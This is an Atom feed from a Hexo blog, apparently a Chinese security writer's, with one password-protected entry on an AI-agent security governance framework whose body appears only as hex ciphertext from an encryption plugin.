<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ColdSnap の Blog</title>
  
  <subtitle>「凛冬将至」</subtitle>
  <link href="https://coldwave96.github.io/atom.xml" rel="self"/>
  
  <link href="https://coldwave96.github.io/"/>
  <updated>2025-10-28T03:10:39.000Z</updated>
  <id>https://coldwave96.github.io/</id>
  
  <author>
    <name>ColdSnap</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>智能体安全治理实战框架</title>
    <link href="https://coldwave96.github.io/2025/10/28/ASGF/"/>
    <id>https://coldwave96.github.io/2025/10/28/ASGF/</id>
    <published>2025-10-28T03:10:39.000Z</published>
    <updated>2025-10-28T03:10:39.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c8a32d8ae624fe6bb65dfbda63512e8d22dd10019d5ff0acf630e9175a37af4c">1440f5520ce0d7064838ea7af18841c50dcabd0b2f9c2286a1edfe2c9a9b10d493479c2db3e47b0b93a6c569a9497a2ec8ae19e63eb96238bf82ca02d4c7451b098d4bf3a53dab56ec598b4b6ed2ef63da6d4ad6a1d9a2a54dfddc0445ee5272920b0813090af3c0cda33cd4daaed662c7ac48dfa9bd7615668f5364bf3d29428cfb045b79b7c69a8cf9ddd4a25c93e8df040e24344f7667547e1de6e43b8eda49455ebd523c603eda72a41e07418d0bdbc9178aba24a7393589b7c33e0068ebe3cb9a6e4e8ac33c5f7e9a3a28c261d9a73ca136777038d7dc1dfc623d41f39e10d975ebc9c161c96f0e356410bc55d68b5bc6598dda1329041323abdd8a04feffdc8024704356911706fe7392948c0467cd53c742e50cde59cad5cc68a79ef4d3ab23fd7c9dc29c291afb17a125823ef0790793a696423f2feb39e931490337a881ad5a0ad10c5bc8a60fd76f9e88c411d3df68154dacb77b8ac5813a9d8e931c43c693c76cf814c650b9db5bc27fb6170ba000b82ff1e9efbbdb446c81ad25d7f30878b67f69bddb16d859f3d00c8f5c8fbdd796f2297adbe6efffc4da64d466e452736496d532583dbcf8a1324755c6fe601cb907f0af2494242bd7ebbc93d9e57b41e257b367ceaaa4211e50c0c49a84a4e9af90bfed6ba9ac4f5b1b9c34eaff96f3bda6850463263af22e20b2fa43a98a8b1e6901e722c46d22700eb34656ed533657f0093f2a31b38a6d368f44734bb021dcfedd6f3ed1e7e164419d62cf34802bb4576a152e576a75e296725c785585db1c5d4d19734f7d243cf79db5b97efeeea7b8cce880ab745917d842a54e2c4b8ab17653e1f1ca812df4442d78aed837446f0a47d9967e50dd4fe8325f4d6dbfdea4bc0359b4c1fdea2975c57040e355381796022df85556e6978dc7770e8e41b500d63fbd4cfc540ad1cc281a3e21d72f07b7cab783609fe91875cf121126dc16db481d92b7e63c2735094556b10445ed577f3ebf5703ca2031d7cf721e8833cfe19dbe38b974bc2cb19a9933db830d4a880050b7e11698cb50645c36b30f23a18831ed91bfdb1a5482d002dfe27e7e1f8c2314126abb663ab3a981f153166236fbc435852a758eb4213b0815270baabc2eb6508e78c13cef8adcb1b36a1313ceb6c1daaca1a60c272c4b64b999d9f20946cc46f5dafdec4f8d2adf54891d1c766a3439c5d7f967f30079dcd30571dbf4ddd7ad4b7bdaec7bb741ed2201e7c3f3e684c01238140fe950af26a849a32749e98ccc6d60a7e69998a7ba8e1892b711ffef7ea433809c51fa25be1790ec31bb5aa74eea2c19c537b07a403a58d8f529031175f01cf3966e2756f02ba5853b871878de16d7a1db7773fe1ecacf3e281bd5f422dec79c321dfad4c229fbc13d194b7ecc702db9e22abff6224a9393e27e49d7e761ea54df6123b2f20663dcb3defff33f7e6ab6c99e922759349b07ceae47a6154f0af357fe4106afadb9ecd7b6ed018e239f55761e54002736c7f12288d67bd0199e55ed0f261c52a68d96fd769b1af0ac86fe8bc2fefab75d3c00f16653c629626811b0d16e79b4a4f032ba5324988e7831740e7a3deb837ac1d87e2e28799eb1679d1a0e082152323303168cf1c91bc1793fd32393ef312c4343685b4ad29927e87856384cf27617c8f5fe1a3987fba1c19b4f1c155ccdd0819e0c584834c1c929987156b469fdf3691d0250eac68fd3ec333a88907427e8d6e2125df0296a9d88d74c1fb69712f359165749337f15ee9f07fbb25e0cac52b6485f5f3f9c59c088e346ca75203a45014552059d96333682382dbce83765864cb8fe3d3c266b74d7424668aa979072c3a780ca4e0c2dc031727029995ed92dad53853b3700adc687fd16bd445a91a1fd4391e094187b03646a67faab7a512de1ea8108a4974c0f7a227f4929e111d87a16ad258890830753f8f1060886f5e9e8634c8fe4848c61c68074a7fc51f2292104d11245298897c92a75c20e4618f76045dbd2ea84626a8dde546d2e221d21e85d1202a7ad4870713eeb8f77f50ee8ab918ccee2a0a3cf8270b8748afcf398113278410f9585e61449a9286edbbdba129ac10ac25bad28a900178bd62fdcc09335e099d48ef7afae032a685b64cd9d6ca7c49118e68795c0455a42828f01fac5dd7c2b13cb84d3f925a1f5bb9466802147a23c7f0a26cbe2f3ce03b86b85c463470d8b04fe890c128cfdb0ae34854a54b08b0a8107a0fc0607c14f7ae5a711debea5c38a421e62b8c00024c615259ff95255df678a0fdfcb60ebb2e89130a599f1bfd93d529b8ec52f80784285d3a7cdcddbd47b020e59833462f4671c7fd2035952038a2f6c36ae0aeff3a6892762728a0c94c6ffa0f02de458044c6568abc2f51086cff2a636ecfc991d0d6684dab1f9c007cd8de3c24b56bacd258463471aeeb3b066824f8db704af86236f6efeba7fd5a1517ff65b8dec83f9e1d85263fbde65f8952d8c2d6659a7941b8939f397aa3f583cd17dab7641b5dbe94c7e040ade0b9e5c7d1a8ea5aa36929a7e9018cb89c50d8a1d830e1166ac8e5a0e13d26620bd14513671fb2c54eec1b8b788e9aa4b32e34bfd42c829e25fa97917b5db301710317defe1f802180d6f020c6404886e109d6acac1bc0d307660a57d4e54c8d185623b808bfc68651bfd79ec3322c2953c64c70fa9716b54f359d705078ea12aca646c0d984f8ee02534e694b426020ce3fedfc7fbc5c44bd50e6c2b43f7e7575b69087af4ae8138ac6fe0055764951fcd5a8cbf02a911bfafdb53f7d068eb6c13e5aa09ddcdf67e14d869b3f60ae298d701fc7e1157bc290a71e276d7b913f032c775d7fa1010813a376037750c9e851e875f19ed1cbe5bc8d0b619fe468be8d49daffbd949a6841f34f064965ee7651f4d34b3d79b25d6ed7210397a5d7381dbd4a6e02cba03feb984c28d83e6ae218e969e705df4c6844ec0180dbe06a75b999787065c031366d02f2189625590f73be8a3d5e9fa1788e0510adb4d82155eb03bbe562b2a774d3e10ed61706861ae9af89247a81ce9628a5eee7b9c7f9e03c88bc312769b8b501d46f67fbfb7dcba92dca97b20f4b9206753435b9598f942bb441ad81f0d843a34b865b1904cbf3051b03b3495539c786f4b23d452016ceb6fd522219d70d8da1efa3dfa3238069d5142a2ef9efb49864bbbd4da49563499b3c347eb7872d0aa5a32bf08e902e8427412dfedf30f8323f2c27d87b345da9ade85ff4fa3b70ad04e121102d1d81103cd8d2ec8df909f5cbc7bb2eecf6e5c5353a13d515da1be4b6f704754a652e0d96ef04afa889bb4fd14b789384b03f3a95a10ca906a22aaac1f43b5e0765b8eae9829cf0064b1703b6b9244a959e9dc5b2800083222a1438efd64b6523c2c63c0cab3bb614be499f5c73a5aa2f97a48f3fd9ca7181f1543ab02ad090b313c358a297fa3bada65134dedc7653fcb6641cf60c3a71486a50da2581c355a0b46c885ccdaad5dbf2d5674ce29211687a2cd125542b4f13d59e8cb88add7b477eba5c7fd28af2710c10b778f5bc246f9625b645b4c1213593e9e5d6454ae5ec35fdae4d2b65464a95062a7117e618ecd44aa9a9d6cf53829b4473eef6c9cfe7a77f08b4bc5814858830a919be9d94a4b3f23fe7fea1513643ab9497f33b4887a36181f40b617068d48c8aa162838bee980ab32daa85aa62896fcfe191ee892ffbcbe31e25236d9c26d6db32fb62718201f00ec9da08c4273300ddded3af8b79cfafaf498edd1d2f89e612c19874e951e9fa05a983a49139bcab4d71b6bc02de3cd1431401b41b6c7e59c6b8289f8a6d465808fe7ef2aa01e8ac6a6704ce4e39224c406e6e2817c4e34ab137adde2f7aac73cafba6e259d72142ce87bd0f3b5fe898b6339c4a7712abeb449c2e6cf35e2b90e92d01d52e8e6d2eef3385f904e5174af73265e25b687430f7be98a1a933f47b7111ff09d3c7ac2a0cb73f0b19d4322a6b247a8490d39a131a4193bc86832c024f4776b1e8631f8ed9f8e98976307f6c967828572bb3209ae6f74e655920c08ecce5d83502e5d1e46711b1eb61202f2c29c6898689a87f64ba154f3a8622858921d3f5325b33a0bb2329606b880285a14f97e92fe2ccdf373f8522518587ff2ba6f196ed9b5ea9bc698f5f28f1b1f44476efad0f4c221ef9cd9633a8dc5172081a395e275745151f16caa4768beb14ba67d105214db72c88933a39a570577c9c36b91e8a4e42a8e351cda02830612d0ba4801d3742529f73fc4690c1026691a05626bc03b819cc8baa068b6e3786241cc19ef7d16209c350ae202efdbf5c39c1d2e23d516ba9479d718de59783016df008cb1f6500505389cfe76eb914eebf4e952e4c8378418b0cac1000a2b16adc2845b75fa9407358e9af6d95e3eb06fc0b0e0351a394f099e837e8e8e4c538de793bbfc691018a060f812e56224454ab7903fae947152cb2c90235ca9ba78b1a7ea823458716d342b37e57ae092fc132382ccc13a146af130a828858454502e44954fd9a63894ea068727f04230ff3356ccbf2c4e7b8f45500d2ca66eb1da55929d623c4a69bc448ab03923f055778896df8eb6fb420dfafea2eec725719f7c6f531479a94625bd1173039ebc4f0ea0daa98ca9bb4dc625e181fcaa7b33b699f6544de10ab955f86288df154553b5411c4c691e7ee6d8b89f40e19f3263b43f794919bcf67d3ae0137e41e4bdde8ddfb9511ea2390c3ac1e0fa9aab1f7153b6e3909700eab95d87486a2ecbfe266c16328576299733ad702c876956097f8c2d2a8cbf0df22bffa01475870b2300e262c1b1227576127e73263bbb7fa88e5d804947d85c68536685da7484d82ce1e7293a4c8c7cba365003b8caefbbd398eec83c94ba2930f189561030da2e4d15dc8d579dd936de54459aab9001d0b39a3832210ab90c4af9be7abf3da06762b680cc6d914144068c186a3d42ed0961835aa5f95a508636cab8ace2bd2dc7d5ba56d770f5273ba083a733fdd8035633f76a2a445a2f45fef141ef10ecd169dee971e93662edf4ef641e71a4876791141bd3d94b07f0c6b082a57c2d4d6583784f1b7fb6c7ce9c715ea27a6a0ee95f5b1636c16efa2344ad6f0a90a0c3e26b3edba3485b920e4a1ea3ce154396d0a5b0d03e07af9ad36c6332f980cdf365346dbeccd3efd85b2d6283ef9cfe6fc93e08e49abc1c4e1229a664767f39ae9ec0f35e328044394ef8ffa757f4d7b0c887eaed64f22cadbd12d9352de131550b8be7308849145f1c7f88f80a255a206ec6d168b70bbe7ad90264599953a990017f38162a694d04ac91674b0b88bc2dff4fb453b9eb8bbcc79b6922f7dde00487f14b8ce137801fb5cc1aa57bb04ddeddb3db96d7b94184e0e6598ff457f30b1057601237fd20e7f50f0aef49db8075f518897aceda7c2e17b7df995a6c20d6f9555bab1581398737df06db9ed1de17ed47aa4ec670034839d2dc81687af320f683dcdd2705787ebb798aa5445f4f1404db61e2d4dffa9a52062004f19d660b9ba4d22cd762e5b18746c47b7a8f24112e24b7970a93dd67ba3f59a180007d52be157012e28366015cef6e9db6abb0fa5a26ab6868b6bdee6552414710f038efda6dab12ca84a6cfbe22c37a9de28a226d9fcd0d34bff6a818c233d692f5cbe2cb9bbcb58fb06492183038808436403db361057aa54f7c7740ad97f45ae8b088475f8c7b3e8e58147be180e1631dfbba14a7819f1d7cfbbc6ee5524f3592852bc1a133b3a9f77e6a166f50b56ef3fecc72b69bffa0304153c15d7a4156fd00bba9535b9f2e520849c5ff3f05dac4e3487a44af823297aa9d52d4390d174c55d1b71387df7ded38d122c91e0352e940a2dd9d143cd99cb16394dcc65080e1edb4b845860624dfc6670f88e43ba425832e00fd8fc2732dc06389fde369042475ddbf9e1559bf6e3cd840179cc0fd90cd10c13bbd3de112fce13b189cb1ac4b90416a38035061bda2f081bfd673703df08b5ad3859d2f5418ed71221cced46e3342a4fdd3aa36c57bb631daeea48b7ade50fcc17088a467e91c73f97b9d10521e553a7d3559abc187ce9138390b015a4d14db3f4074b644245041501998fcfee4d8cc6deb9ffc71cd5b2f7aea4ec8e9f86c20d03c4b746b8b517fd489f5168ce6634ba68b8ecb7bb28b410f21563c482e7bf98598afa2a780f1ea5d1acee5da5a4f670a0af76920d7e511e3cbedded7c074584be01e1019ae2ecf1a22860931d6a980fd70e5f0e30a113c36d6bd526d78f6f30ab82317420dad69c7610bfcd40c295eb545dd50d31fefc7b02160762ac96348d5f24e3ccce3c0faf5b49eb4dc6a3fad8005e96550923a864315606619f0441e875f6bcdde2c3b50255f2923515a032bf6888aa1c23f7723782b4d250ccbd81099d9529131f374dc55d66083ce1c3dbcef9e90b55d242bcbce493af763a293ac973865f8dbf15a6c16775e39c394d239db718052134f4ce44359437a244d6aba4ea5afeab5c9a63d9b8eacee8acd00888cf47b2d00df08fe4690e6c0504ca9812a2b75cdaf23130405139773e7c8e73d4b6f478b8e6c48a32f616379c2ded9d76e605ee5e0bf9aece31e60d5d8008f33801b0179309e05f93d04d6334d4b4ea50cafeed4ef96078c3dd6c683822bfd44843251b418799d18ee176ff7fbac05fe6d19ec63a812f0ff32f742c2f01d0991639504ac9a25e68d469734080cf7c24af8be9f98505dbf55b263991cf2d215c63027af627d993a53a6bd13beb6f3c6806173d87c5907e28e8d3088e49b7a785eb7fd29dc61fa2b9caf83c970a237dffcdf6e31b717ff85ba9a3dafd9ea6f598aaa76fa667c16aa7220aef226982a09123faad5ae1e8f81e5f1d066b0face6e496211dd8d33a47d35fa2bd61bbdf861485c6711cae83c0168ee87b847790a69934750a84809f8315bf7b43d09eaedd6e4c653e7aa1d9ea6a8f8caf6561e27f66963eb76a4f2b1a5368f82bd47cae2b99a3e7c6393d1c01c3a0f2023cddf2b90a5b307db60f5175036796307b846a7435e18baab3d607e495d21a54c354960485679c45644daaa2ecf61b51b77f60197198a3923439b0f0d535303b991a8dc10953aa0ac0f31dbef79160fb942bd37c7765fc63093641b85e01483087183af8ff84652f8da7594ed8cb454209e79c9638bf5497699a4c3dc09bea466779644814329e72d90872698439007a8a26ee6e806cc72cd03f7a23a86ff4d456cee73f7c1e4c22195c676394195aa1beea83bab8a022bea7f2f1d07e7aa54678962bf0f9a94c7f5a20d27312d2c28bcdd7ce1e4d0e021f3c2b0a775af8fcf1af3ade99bfef9d01e251dcd734a06a47ecbc0982f33510bc4a22a89841755797c6d3eef0fe388ae89e2e57d7ea88a1ec3be7c9eb95d9651196af278ed3da33cd313fc7d855e93c3a3e4e566c81cc19361229368cbfb13bd495f41cdb86e3e43d7c5a120209832490ecbcac7151c6ceabe5d7d05e5466a936fbec512ca3024d14943b2cef8eee551b36df341fe24fc7b7a6d849126d28748c9204559107508742938fea2281b427b7eb3eb1bc0d39e423373c8c0d571ce6407cc1cf9b3789510e73fb2fb15256fe676b6c3e1034b43ac10936974bdaa824e0c34d2d0b1bf77f1e09f064c540cb5ca2ea28140e9a1ae364cf1a4b4047d757547632a6ffeedf4787721bab052eed9aac2590508ce179fda16f4f4802e09a825692a4e1733497fd566bf16d12ba7c5b53edaf62209e523a62587fff5dbd33f106b22111934d9cb53b6a318481c99ca1bb06912ee334d55c900044832d6cabd71ae280c6502a23862a94a0e9e32595e8961b32a033231b48c846a38915983a2300d33d25fb454bdd9a13ffb0d77beb5374de4359b25ad32e5891e02b5276d6217006da086bdf8a8eade1675e25e5110383613ce0c5a8bf3bf422465417ce350fd8bc24dcf4e212656f54e03b27277a30a8a006740b7e5cfe8c5823616a3ed604b9f60ab012d6c249a9af5e183c5fb5d2e91135a95bc0eb8ee5cf8e53f39380bf4edc2048166f36908e36dfa54f68fac85142e247022576c6a3a78220e4c09167e49af2f4a72f91c88dde7e093dd0e6ad76d0706e35e28871b727eb218e039aa3ccfcb65bb5ba4b52cfbcfe0d5b93af74041e2e535204cbdf18220ac3e9526f8240d62f4d3ca639ce9e9aba853e391b42d6e05fdac72000816bdb1f3f21f056ee45b65f045e5d5ecae17f59dd73e01528ec71a7f428351f7caf50d0de876c804d73cca9feca5a843010541ef731466a1552ad59b17c6fedd36a606656234272905bed63487ae9d148b288058f6ac8907a2d422bc2f0ef7cfc7db3ab170ab021dc58d3a817abb066a68938bfb5441eb61ebf23b760633ca8a308db429ad18e0eac3bbb805f7c477cbe26502e6194807d35a35ef83d97be23bf057844c6f2eeedb254da5fa148297cfa5f430517b298c3a27d120876ab205e7ab77cd15a838ad9e7445001c285018f02d5cec55e675edf18c9e97b3efcb80b59463f1431a73ce19ed7dec78bc832558153273cd7385615b69b7e9f6a84dc3deca360062c750cc39c71aa344a3bbeb521d9a207d1de8ffd7c903c5bbc93ac1ce0f548941d5ccdf585f0336530a5afe1835bfb88ce6df076b0fddac85d69a62da57c15ec73d635c101c8c0c62923ac1b86b4d208493b69cd3c8a9d6e569110c4c9e7ba136c882b3bbcd6fed3cf6d32043a318aeff7c0371e25955a9c8aee7241cfc4c5375ce3fbdeb1097af0c7c31306ab2374dfc0c774c5fb1d957a5431863ac6bca8a3cacc4c7d02a99e829dad1fa71900562baffcf249438bb497d3e3112cbc5b86544a4beab93eebaec55fd81f9eaf2b0dfd53df8639cc34c0a12c6c4640d1511fdc8a53f80a65a8596d7a3f50f9a536aae28cef60ce444999568c8ae76787985b2eafb0d125fe1d71e9707e8951fa0ba2d227daf0a121f0e853529aed6c91aa2da556a7c101a0709d3bfd78700dd0189baa8644acd627164f884ff7182640d456bc291b3531b1b8a522ee37cb62d7f4966b31b529febdd1e6db0ecf4f42e5fd7a65f2aa0a0dba183c9a28456fbb9bbfdfd22d705d8bd7ec4f544742de14a30c21b7f79c5ee4b95c93ccd8548d95a445135315431a22a792b819e3e82818ab770512e7d8b41883213ede367d7a25c09304961cca30c36e24f9958c50a21137d421e5590133ccf359ce992ad5a7824f189f5b4a555843199b80ecda8fb206fd0e185434c471b65b1d6169b7b434998cd2b687c9909eb7f66ed4131285f0c0587faa60930250a800717f76a1d009ab17ca43efe69de5efdd494f561cd2da585c0922ae4f0e9fd953356afa7518a3e12a8da6b40bf7c1b651a194bc726793cc98e5e3f1c4406ed95084bb30df6b8b6fd04858ca89fc88f0d31772d24ee53ff4f7162fd5cfa453adfdd3f41f29d28906db1541d2938b128d6adcda85e6686ba6ea25219ccdc838346804d07bac618e0b9e7ca4f388759ec58c7620e9c4e917c91a556b66ab4105f339b6db6cef931c0a28af1f746c392f44981f7a21aa6caea94e9ed248168f9e832908b4cd3c6bfa4c7c96744e5a38a5e29072bc8f3b9bdb3810fddb530050511666acd5abbe37ee278d3f479eb24872c4685c87e8211ada75630b3ddd534fdb3cc6e4e408bfd9842f8464e82c171f82034011d3ad78ab98b28c7c90816480b26361e730d0e062b072acd250ecc7151b8107de1d98e3d9c61fe79b732266e8c86db9cde2e3d74b597330ab3e12c32c613bcf302d56eda0425a24c25e992fc8a42c3194af5698e3fbb89319e45fc35d9d470d6e78a9feda926ee8c043901f0f485bb0478196e8806c205f59e51dcb9eefa5f6e5b182434d638ccb5cf27546de42912186d4f05551932ad22d17ccdcb14811e98d6aed4338bef192c4831faa8f3624e574c9962b47b7237fce2c6c607eb78c9d424f993757c95db2a4d7ba6298c318cbefbb6f366491c7a32342112ee4a14c073e7d8bb55b736e2b2270cb9734101a8a4bb8cb7e78434bfd024c7ebfb91fb060399a384f306b10485cd78aefc2c8ffd063b014a3e9209111223fc49542be289f9b54157da6699ff3237a979d264de6eac09f73abb9cc3f2422307bb9a30ca3e213881a2f0a4511518eb0a866315817e7222a48617ca9392bd2eb69128f4d5226854bda7b8b30f4cf2dedf058d0226132a68dd5623cce5b9b41987a3b769baac9a846d18df5fa8e0b7c9265a66a8af83c59ba27bd7546c25b7ba38a9330e41b8df27ca8d2cc79864781ace18e59582c592a1381572046c685203559f8e9ef5f0fad7a5ac4ece64fdbaed36360a31c1dff925c7297b672ff44394e87fecfc5ae79a8b7502cceafe8501c90051c659b2afee1164b219b9c5df39ba33201ddaa071d5c588646d05292fe4a6ce56aed743d0c9dec9ccf5452ebb833d7a01c893bfa793e203aa1e5ba70e543194b0cea34c9236b62a73c1c9138be33e5b268ca0331184eb170208327c613c5f8561be877ed93d820e69d37ae6db32d9ffb9ed8727e83e4ca161881f309bb1af198ad400e02f5beff72170a2b29d8a9d64d3ed7b584826e12f54ea28c2d21f8ffceb676af9ea563ecc44245a2dd0b7768557944c876ed9a79aa2f77c2361a4700ce211443324a1a31d459e26c68161e4e4f1f346c7e5aa9e1eefa61c7806a4e8a048d78b294b57de8b6cceaf6c88faeda44246cf07cb02f0b061dfc0983ac2add5f96af82ef002c9ab8a750f40896d421df77cab8782220547eb0e9d64fb2144054aa8f2ace704dd3503a951972849f5a8c0e828ce71c42aa92c2ea62922c1ac15179b617afd5f89e2bc7df6f9fb809f170c27247ce3f8159c42f170429524a5cbd8e77c332185ac329598dc0a01907d8e0203e6375f93c16157c6509e79794e427d6853777d21427f09795f879a88f1acdc46e8f7e3a305753afbc9d753e07ad00ebe21384ac3117cd6416e9f740ee8fd8d7029d54e9fd20910b38cc0052c3320554fc8bad9ba5934cf087659415f90618ae19a967dc7fea2380492e751fab91f7c951d8e64370817e506afae562a2b5609ea0ca5255b394f7784f839a5c8b02ab9f315b752aff082185fba573b5af78328966ef160825c9a58f1ae4040bfb28d6ee7ab1f01e3a18f4af47566412881dca76da02dde8de2ae1fe31646c1ab403d331ea0fee977fca61404f2041dde0ce1ee52d7af50f11dd070e5635bf86ccd70c203051e5df20849e17cc68292144c73c44ffda492cbdcc264a9cd10bdd8d58ccdb018a278b154149f367b32bd652ea06f0a3c45fdf67a064560cbc679955ff8adf82bcad42c8f00c04911f138fe05159b4ce0b527a8061b5b24fc9f18e827c7e1e061a9a0dfec624a5c22d232d4e8ebb6e3c174677c9befc82f6c696c63f56a8393df0602b55aa447754aa8983c9474bd5277f800bac41c3e3c94c7ce893741a23dd12bc819b616da5b0062b6107d333fead7e243ac914ed76dd07808def8605a32d21bbf32610c71aed77c9bd13c25b1c8abcd562929270387b96eef30bc6f8548b1f56e9a612551b1ec800988111e599513beba220f88b2cbf94cc554fbda5a6788c9bb1a9a6dd6f64cf3d7ca44bb7f2ce4deae0f77643f2aa7304e07c0745b749bdc2536add68b2c6e308d8ddb96ce4a1ba263f02b88c556ddc036fd51b4f2c517a855c7ac2c06da6881cfbd4c53eea900694b604f3a36c7d6ab14a538258515fddb844d60286e9099b273faeafbafde0221e4e52ebce0c1a02be21fff0faab0a8d1bcbf3929db392a649e539bab9b9756efb16305be5744c8380a06f187cfc7daa2c4962fb1f8d507a3ea6882b5571b9cc43642ddabc4aaf8f43e5929206576fbcc22c4420128d441b038af48f447016d6d11c4be8f0bd461920e18f60b9a72e1f4954aa757ec87da15f2b6c53062f22fee7b5655e4d7c0fd89b98532c4f010baacb8a20ad0dd8d341c28d7de169659f62b0d47a81ddfc98de25ce1de059dc581d9b4df4844eea943396a01eab16df20ac82a69054e8432d45fd94957a56114ca67f0927eb221895f14e542e5c3cad4dc204d045579b09bf896a696496cd4f2310fa761485fbf0d3b4b4c3a75c4729696d80768f52900d95c066c06a3cbbf2ade2f819a7ebbf90a7c945e2a1ade6fe7cfbc6514e938c4bab11bc6bb34441a330530e390afe24d1e6709ac5563dff168207f9c33a2a321e1f1370cf0d54814311641eccde6e11db6771a3214b1684ade8246a6881c1d388846819c5f0e4095f275d42349358288ee9b8d907720d9d911b704b268840aa0e96a54881e49cb889fe1cecf39246dd8e71e85129cb9af0ed28e7d4ffde91f88c8abcc554adec970d62edfc4f797a978bb0a846bd66803193e8d79b83a38ef063ae4771dd30a7894dc4ce47d2f7b70a97ce089d68384ffae14128d628d1429a0d7bc9c21fd8c6252304e56a83cb208dbed4a0e548014774341be96edaed67a768b44d5c66908817eb1073f933f16f737adf1a955c03701765941f5899db50505b9b7bbb81f2e3921d0b48d307bc8861aad058ddf25c4e67c300a5d08f182eace4bfe9e6722b80457bd0823d7d8d955f740ce4f2fe9273a5a3f6155d6b69fa2ac692f290af14521b855d8961f68bcc603bf4804354666a308f0d9205013dd6bbdbf053c5fa659de97be9dee3555f2ef4df0c48f0a882de64bedc81af5ac85677412f7aa8aa026a904df82ed66cc0dcf6adc5d24e05c8c50753d068b20425622146b9875e012f8cf52a49856cd04f1d6db1bbd617aaa0a669d374b690b8a2f536c7c09212f9686b5df90ccb31a50cc02a2ab4e04fbd3749990c23ec60e67e4a41e2356567a44b69f9cb9a686a249038deeb1de78dba38991aff080f7383665070cf33ba09cc80fa0805fc1ab352a4e0c2ff3861f609310a886a61240b9b149e50a31ea4487779b8ec06aeb7dbb11a042649044c0f54d4a9b2bbb84c24d83f17f4334c8359e70b6f1309f712628d832ca01d8efb2dc051604d2628a52b9140f1719643775654bd7ed9d2ba4318b8e005c1b2a5c81913563343abd2b2019a12cd1efa85149006103475a48290c2ec49f3ed085ef1db0a6b50527c83f1066ef59c18a9f7385ff51549ab754a1813ac4b7fcea718769f419ff72ae995690860bcb2f5a56c8e7ee3091eef18b2e46b5f79edf9216b47025cce77fa7fec2ce87d6c65322e3bd65b48a2d85b0a85a9429a82f6b51d94c9537ba9264751a55ebd461fb34e8a70e67310674976f35428eaafbb7eedb53cd2bb92def5ec338a541a57fc865ea7ed0978dcfe8a415ea110086125300884bc3a8a84bc72a46ccdd3b4d9f1e8bd09d257702525d30fb74cf91bbb924ed5b09b853af7b01ba523ffaf73147933b174e874e9b6f98e7f38655ba78f6445f7d617147e6c0af32de15fc1342660834d97563c05a4163f313732d3f164941e9946af83f4b2cdf589b83fe24d5ea4377a0562e32db3d9ccc7d13f8af83cadb5f544101846f462bc6e03214df9fc764aa144f01bf870ff368ad84f0d82d4a2b71a15bb67c9a0d49804cf5fc14e5c267dacb016c69f08bd638e0596342a63cfeba5a4d223d4f89cc08aa5a8f97bc3449b5177b30d42b8d08ef47b4a6b745487a8e6f91099fd53d519c83c454d11a29ac286b2a670f4837cfdf29e3bfbdba2db87a06996e85c7d0c0ae04ae5cb0a7d76c215f8b14e252c624d66a2d348ca8a0d071c9736fcf5cce6df02b91a1812b3a28ab025c7607a2ebb5a73f07599bc15e699f11327fb141ca6c9794549fe8a2a21a3ef9059c3d510d2b43011f3b224ededf10245368a1984bb75cd098edd8c081d60dd5c0340bd475f3749efa0dddca11241c02058f23716e303e2351e550d2ba6201f97d5899e30dc36d1b842269143d76b71c3450e411564bec1f8cb38eacd2ddaf7a38178950bdbd5633f6c85a00122086b06f12ad7b15de19ffd037e8814bffda0f5e594cbd89194a27aabd740476b2668bcd28e8dfeb313a31ee8801cb05ca7f336a6886b15ea340c1741948f8a8e9318aef5f126940b077bc477a844c27827b30b5ea7ab769c066e3fb1d979b098be7a028d448c6308c2f0c95a08b89c394a611d602c15af9e7c741e74ede1a005a07aecaf4f23a5d4f7885d7e5853ed8439b6b1bb2f233f5acfb092e5da874b6e9d0a383871c23d513974e2f255aeec919be2602aa8d930fdb712bfb33aa7a11ac292a9bf370ae6ad11dcb659a328149fa6cb51d3098384c7352b348506931d9258600e7d517d3f54bedf9ae689d5ec88b6734cc6011f38237b1a929b2c04e14b3f6b8af0ec10b8b6e4df4d03e004fd7cee045047f299a5424061502d0a1023ba2239cb8952c7af93424b8c597c7e78d2076b4c8ce442fac7c517c6f6610887ced88b97c58689ae363ba140d3f4158ae4789de3389d5b5e809a446aaa12ffabec09a8cdcc01ec3957c9ee522f7b033828cd02f1cf6facfe1d8273e40cf85f2494f5d97e3be17c2b1c2d90bbf8f4b32410e7437ae324dbd8d29708e61a93bd40ef7fcb230f62729ba798309c8db1c63ee45ffe21e2bfe35b8f5bace118c098a5d9632d135beafa0c89e43c541955d85d26c3db8b70b7ffb188235e2cf0a82e15a898d4038fea2bf68ff747960f496b8e534428c75fd48e25cc83ae7ed37cf8f5a1cae70db6ff03106f9fa34cec5787e5a1ca953c548a48301fa70363311102ec6ed7f4f8d9ebab0670056ade432a99f304e9bbbf96ac80ec2dc9ff4b1cf15f49c5cd477d9b457d7d65fefaf3641c457259af5c4a343651984374d1bd2e57759ba66794d2a268eb0a2a1e7b2246cb1b68f9db4daa8bdc9740fb3814a48a8d152b00518e7cad2bc7145658e996e8129c1bc7e43e1440eacb114bd761252765882036a5eb801b4f191b64f50e0bab701665b5b97d5489bfe24601792b7c9ac846252922319648fd0c490574470d3c7b273ea644531bdca53e9f21bf60d86fbb57a2884d2580a707aed412df3b9c01c089bcc133a96688f5f361c0d28aa25d979fbd488394784a8020fd123214956f352cb4a9a2eb5536771f0a7f2f87e09f478aeb62d2cd8e0601ec995e99a92debbf069f982fe3ee873dcdc43e1b8c8db3490b80bed70342d6f1aa6fcf6b6a8f7b2a10101d28867edef2e691028e0bb0cc91cef9fafd0c4f1f86b4cd04088c2a47079c82696f91f413a3bdf7b1e979f39680351c901bb492d729ab12c02c45c4f3d30de78337ec3cb7c992b86036556c7e6e87af52e4132d3752d6ca89471a953b3546876fae74e683579d7c6820e9d514d8d3c39579e53eb7e1b9b009a2d19944d1b8019e6fe7c0eed04f80336571a2a84befd006eeeab2b12068292d4a34a1c3a48db50790e00c63ba237ea327e547d1425457848d63987b408a91161db075d9bf3f2cd7ba1a416ff38768ec7f46e954094b85afd743d46645171e35c568b98d4b8210f4c04fba4e10912c80cdcaf2cdcf37b737483e362b396fd7511fe18ca693fd9cff106a8a73559772aadc5f263433657d0e1896aca185f133313da4c7bf4881548220b8928396d33da4e57a0e2554533e2036bd139b367263ce11706c36aa8192c9e8150c873071bbdb60a4d7f0af941608c2073ae9cf0c700ce0f067e7f741323b748ae92